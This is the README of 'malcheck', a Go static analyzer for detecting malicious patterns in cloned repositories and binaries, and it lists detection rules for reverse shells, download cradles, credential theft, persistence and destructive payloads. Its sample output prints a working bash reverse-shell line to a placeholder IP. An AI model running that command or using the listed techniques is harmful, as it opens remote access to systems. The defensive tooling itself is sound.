# malcheck

A fast, low-false-positive static analyzer for detecting malicious patterns in source code and compiled binaries. Built for scanning open-source projects you've cloned and want to trust before running.

## Philosophy

Most scanners fire on every `exec()`, `eval()`, or backtick — generating hundreds of false positives in normal code. Malcheck takes the opposite approach: rules require **specific combinations** that are nearly impossible to explain as innocent code. A single `exec()` call never fires. A socket connection followed by a shell spawn does.

The focus is on:
- **C2 communication** — reverse shells, download cradles, beacon patterns
- **Persistence** — cron writes, registry Run keys, SSH backdoors, LD_PRELOAD
- **Evasion** — debugger detection, sandbox/VM checks, log wiping
- **Process injection** — Windows API triads, shellcode allocation
- **Credential theft** — LSASS dumps, hardcoded secrets, credential file access
- **Destructive payloads** — disk wipes, ransomware patterns, fork bombs
- **LOLBins** — certutil, regsvr32, rundll32, WMIC, mshta, bitsadmin abuse

## Installation

Requires Go 1.21 or later.

```bash
git clone https://github.com/your-username/malcheck.git
cd malcheck
go build -o malcheck .
```

## Usage

```
malcheck [flags] <file|directory> [<file|directory>...] [-o output]
```

### Flags

| Flag | Description |
|------|-------------|
| `-r`, `--recursive` | Scan directories recursively |
| `--severity` | Minimum severity to report: `low`, `medium`, `high`, `critical` (default: `low`) |
| `--depth` | Max recursion depth, `-1` = unlimited (default: `-1`) |
| `--ext` | Comma-separated file extensions to scan, e.g. `.py,.sh,.js`. Empty = all |
| `--bin`, `--binaries` | Scan compiled binaries using `strings` extraction |
| `-o`, `--output` | Write results to file. Format inferred from extension (`.json`, `.csv`, or plain text) |

### Examples

```bash
# Scan a single file
malcheck suspicious.sh

# Recursively scan a cloned repo
malcheck -r ./cloned-repo

# Only show high and critical findings
malcheck -r --severity high ./cloned-repo

# Scan only Python and shell files
malcheck -r --ext .py,.sh ./cloned-repo

# Scan a compiled binary
malcheck --bin ./suspicious.exe

# Save results as JSON
malcheck -r ./cloned-repo -o report.json

# Save results as CSV
malcheck -r ./cloned-repo -o results.csv

# Scan a directory including binaries, save JSON
malcheck -r --bin ./cloned-repo -o report.json
```

## Output

Each finding shows the severity, rule name, line number, category, and a trimmed content window centred on the exact matched text (highlighted in color):

```
╔══ ./cloned-repo/install.sh ══
 CRITICAL  Bash reverse shell  L42
  C2/Backdoor  ·  NET001
  Classic reverse shell redirecting bash stdio to a TCP socket
  › bash -i >& /dev/tcp/192.0.2.1/4444 0>&1
╚═════════════════════════════════════════════════════════════════════
```

### Severity levels

| Level | Color | Meaning |
|-------|-------|---------|
| `CRITICAL` | Magenta | Definitive malicious pattern, almost no legitimate use |
| `HIGH` | Red | Strong indicator of malicious intent |
| `MEDIUM` | Yellow | Suspicious, warrants investigation |
| `LOW` | Cyan | Informational |

### Output formats

- **Text** (default) — colorized terminal output
- **JSON** — `malcheck -r ./repo -o report.json`
- **CSV** — `malcheck -r ./repo -o report.csv`

## Rule sets

### Source code rules (`rules.go`)

| ID | Name | Category | Severity |
|----|------|----------|----------|
| NET001 | Bash reverse shell | C2/Backdoor | Critical |
| NET002 | Netcat reverse/bind shell | C2/Backdoor | Critical |
| NET003 | Python socket reverse shell | C2/Backdoor | Critical |
| NET004 | curl/wget pipe to shell | C2/Backdoor | Critical |
| NET005 | PowerShell download cradle | C2/Backdoor | Critical |
| NET006 | PowerShell encoded payload | C2/Backdoor | Critical |
| NET007 | Hardcoded C2 beacon interval | C2/Backdoor | High |
| NET008 | Raw socket shell spawn | C2/Backdoor | Critical |
| NET009 | DNS tunneling | C2/Backdoor | High |
| NET010 | LHOST/LPORT C2 variable | C2/Backdoor | High |
| PER001 | Cron persistence write | Persistence | High |
| PER002 | Systemd service install | Persistence | High |
| PER003 | Windows Run key write | Persistence | High |
| PER004 | Windows scheduled task creation | Persistence | High |
| PER005 | SSH authorized_keys write | Persistence | High |
| PER006 | LD_PRELOAD hijack | Persistence | High |
| EVA001 | Debugger detection | Evasion | High |
| EVA002 | Sandbox/VM detection | Evasion | High |
| EVA003 | Process name self-check | Evasion | Medium |
| EVA004 | Anti-analysis sleep loop | Evasion | Medium |
| EVA005 | Log/history tampering | Evasion | High |
| INJ001 | Classic process injection sequence | Process Injection | Critical |
| INJ002 | Process hollowing | Process Injection | Critical |
| INJ003 | Shellcode allocation RWX | Process Injection | Critical |
| CRED001 | Credential file access | Credential Theft | High |
| CRED002 | LSASS memory dump | Credential Theft | Critical |
| CRED003 | Hardcoded AWS key | Credential Theft | Critical |
| CRED004 | Hardcoded secret assignment | Credential Theft | High |
| DST001 | Recursive root deletion | Destructive | Critical |
| DST002 | Disk wipe | Destructive | Critical |
| DST003 | Fork bomb | Destructive | Critical |
| DST004 | Ransomware file loop | Destructive | Critical |
| LOL001 | Certutil decode/download | LOLBin | High |
| LOL002 | Regsvr32 scriptlet | LOLBin | High |
| LOL003 | Rundll32 remote | LOLBin | High |
| LOL004 | MSHTA remote execution | LOLBin | High |
| LOL005 | WMIC process create | LOLBin | High |
| LOL006 | Bitsadmin download | LOLBin | High |
| OBF001 | Base64 decode then execute | Obfuscation | High |
| OBF002 | Char-code string construction | Obfuscation | High |
| OBF003 | Eval of encoded/obfuscated string | Obfuscation | High |

### Binary rules (`binary_rules.go`, activated with `--bin`)

Binary mode runs `strings` on the executable and applies a tighter rule set designed for extracted strings, which lack code context.

| ID | Name | Category | Severity |
|----|------|----------|----------|
| BNET001 | Reverse shell string | C2/Backdoor | Critical |
| BNET002 | PowerShell download cradle | C2/Backdoor | Critical |
| BNET003 | PowerShell encoded command | C2/Backdoor | Critical |
| BNET004 | curl/wget pipe to shell | C2/Backdoor | Critical |
| BNET005 | C2 domain/IP with port | C2/Backdoor | High |
| BNET006 | LHOST/LPORT beacon config | C2/Backdoor | High |
| BPER001 | Autorun registry write string | Persistence | High |
| BPER002 | Cron write string | Persistence | High |
| BPER003 | SSH authorized_keys path | Persistence | High |
| BPER004 | LD_PRELOAD injection | Persistence | High |
| BINJ001 | Process injection API combo | Process Injection | Critical |
| BINJ002 | RWX shellcode allocation | Process Injection | Critical |
| BINJ003 | Process hollowing strings | Process Injection | Critical |
| BEVA001 | Debugger detection API | Evasion | High |
| BEVA002 | VM artifact strings | Evasion | High |
| BEVA003 | Log wipe command | Evasion | High |
| BCRED001 | LSASS dump string | Credential Theft | Critical |
| BCRED002 | Hardcoded AWS key | Credential Theft | Critical |
| BCRED003 | Shadow/passwd file path | Credential Theft | High |
| BLOL001 | Certutil abuse | LOLBin | High |
| BLOL002 | WMIC process create | LOLBin | High |
| BLOL003 | Regsvr32 scriptlet | LOLBin | High |
| BDST001 | Root deletion command | Destructive | Critical |
| BDST002 | Disk wipe command | Destructive | Critical |
| BDST003 | Ransomware known family | Destructive | Critical |

## Adding rules

Rules are defined in `rules.go` (source) and `binary_rules.go` (binaries). Each rule follows this signature:

```go
newRule("ID", "Name", "Category", Severity, "Details", "RegexPattern", "keyword1", "keyword2")
```

Keywords are optional pre-filters — the regex only runs on lines that contain at least one keyword (case-insensitive). This keeps scanning fast on large codebases. If you omit keywords, every line is tested against the regex.

Rebuild after changes:

```bash
go build -o malcheck .
```

## Limitations

- Static analysis only — cannot detect purely runtime behaviour
- Binary scanning depends on the `strings` utility being available on your PATH (standard on Linux/macOS; on Windows, install via Git for Windows or WSL)
- Obfuscated or packed binaries may evade detection entirely
- Results should be treated as leads to investigate, not definitive verdicts

